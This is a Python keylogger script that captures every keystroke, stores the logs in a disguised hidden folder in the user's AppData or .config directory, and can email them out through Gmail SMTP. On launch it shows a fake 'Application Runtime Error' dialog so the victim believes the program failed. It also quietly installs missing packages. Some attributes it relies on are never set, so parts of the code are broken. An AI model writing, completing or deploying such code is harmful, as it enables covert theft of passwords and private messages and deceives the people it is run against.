#! /usr/bin/env python3 

try:
    import subprocess
    import sys
    import os
    import getpass
    import platform
    import keyboard 
    from threading import Timer
    from datetime import datetime 
    import smtplib
    import tkinter
    from tkinter import messagebox
except ModuleNotFoundError as exception:
    subprocess.check_call([sys.executable, "-m", "pip", "install", exception.name])

SEND_REPORT_EVERY = 60 # means every '60' seconds, change as needed
# EMAIL_ADR = "sampleuser@email.com" 
# EMAIL_PWD = "password123"

class Keylogger:
    def __init__(self, interval, report_method="file"):
        self.interval = interval
        self.report_method = report_method 
        
        # the keystrokes within 'self.interval'
        self.log = ""

        # record start and end datetimes 
        self.start_dt = datetime.now()
        self.end_dt = datetime.now() 

    def callback(self, event):
        """ 
        This callback is invoked whenever a keyboard event is occured 
        (i.e. when a key is released in this example)
        """ 
        name = event.name
        if len(name) > 1: 
            # not a character, special keys (e.g. ctrl, alt, etc)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "

            elif name == "enter":
                # add a new line whenever "Enter" is pressed
                name = "[ENTER]\n"

            elif name == "decimal":
                name = "."

            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]" 

        # finally, add the key name to our global 'self.log' variable
        self.log += name 

    def update_filename(self):
        # construct the filename to be identified by start and end datetimes 
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """ 
        This method creates a log file in the current directory that contains 
        the current keylogs in the 'self.log' variable.
        """ 
        # opens the file in write mode and creates it 
        with open(f"{self.filename}.txt", "w") as f:
            # writes keylogs to the file
            print(self.log, file=f)

        print(f"Directory: C:\\Users\\{self.usr_name}\\{self.dp}".replace("/", "\\"))
        print(f"[+] Saved {self.filename}.txt\n")
    
    def sendmail(self, email, password, message):
        # manages a connection to the SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)

        # connects to SMTP server as TLS mode
        server.starttls()

        # login to the email acc
        server.login(email, password)

        # send the actual message 
        server.sendmail(email, email, message)

        # terminates the session 
        server.quit()

    def report(self):
        """ 
        This function gets called every 'self.interval' 
        It basically sends the keylogs and resets the 'self.log' variable.
        """ 
        if self.log:
            # If there are logs in the file, report it
            self.end_dt = datetime.now()

            # update 'self.filename'
            self.update_filename()

            if self.report_method == "file":
                self.report_to_file()
            elif self.report_method == "email":
                self.sendmail(EMAIL_ADR, EMAIL_PWD, self.log)

            # if you want to print in the console, uncomment line below
            #print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()

        self.log = ""

        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread dies)
        timer.daemon = True 
        # start the timer 
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()

        # start the keylogger
        keyboard.on_release(callback=self.callback)
        
        # start reporting the keylogs 
        self.report()
        
        # block the current thread, wait until CTRL-C is pressed
        keyboard.wait()

    def create_on_run(self):
        if self.report_method == "file":
            # finds the users name and changes into users home dir 
            usr_name = getpass.getuser()
            if platform.system() == "Windows":
                os.chdir(f"C:\\Users\\{self.usr_name}\\AppData\\Local")
            else:
                os.chdir(f"/home/{usr_name}/.config/")
            
            # creates a secret directory
            file_dir_name = os.path.basename(__file__)[:-3]
            dp = f"{file_dir_name}/v1.2.4/{file_dir_name}_data/"
            try:
                os.makedirs(dp)
                os.chdir(dp)
            except FileExistsError:
                os.chdir(dp)
        else:
            pass


def fake_window():
    # hide main window 
    root = tkinter.Tk()
    root.withdraw()
    messagebox.showerror("Application Runtime Error", "The application was unable to start correctly (0x000007b). Click OK to close the application.")

if __name__ == "__main__":
    fake_window()
    # adjust 'report_method' to 'file' or 'email' as needed
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.create_on_run()
    keylogger.start()
